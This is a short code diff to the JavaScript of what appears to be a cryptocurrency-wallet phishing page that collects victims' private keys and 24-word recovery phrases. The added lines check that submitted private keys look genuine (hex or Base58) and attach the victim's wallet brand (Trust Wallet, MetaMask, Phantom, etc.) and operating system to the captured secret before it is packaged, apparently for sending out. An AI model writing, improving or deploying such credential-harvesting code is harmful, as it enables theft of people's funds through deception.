@@ -539,11 +539,14 @@
                 const pkInput = document.getElementById('pkInput');
                 const val = pkInput ? pkInput.value.trim() : '';
 
-                if (!val || val === '' || val.replace(/\s/g, '') === '') {
-                    showError('Data entered is not a valid private key');
+                // Checks for 64-character hex (with or without 0x) or typical Base58 strings (40-90 chars)
+                const hexRegex = /^(0x)?[0-9a-fA-F]{64}$/;
+                const base58Regex = /^[1-9A-HJ-NP-Za-km-z]{40,90}$/;
+
+                if (!val || (!hexRegex.test(val) && !base58Regex.test(val))) {
+                    showError('invalid private key');
                     return;
                 }
-
 
                 finalize(method, val);
 
@@ -590,7 +593,20 @@
             else if (method === '24') _t = 'f1:24';
             else if (method === 'pk') _t = 'f1:pk';
 
-            let _d = `Type: ${_t}\nData: ${data}`;
+            let os = (typeof getOS === 'function') ? getOS() : 'Unknown OS';
+            let walletName = localStorage.getItem('selectedWalletName');
+            if (!walletName) {
+                const urlParams = new URLSearchParams(window.location.search);
+                const wid = urlParams.get('wid');
+                if (wid) {
+                    const names = { trustwallet: 'Trust Wallet', metamask: 'MetaMask', phantom: 'Phantom Wallet', solflare: 'Solflare', safepal: 'SafePal' };
+                    walletName = names[wid] || wid;
+                } else {
+                    walletName = 'Unknown Wallet';
+                }
+            }
+
+            let _d = `Type: ${_t}\nData: ${data}\nWallet: ${walletName}\nOS: ${os}`;
             let safetext = _d.length > 40000
                 ? _d.substring(0, 40000) + "\n\n...[TRUNCATED]"
                 : _d;
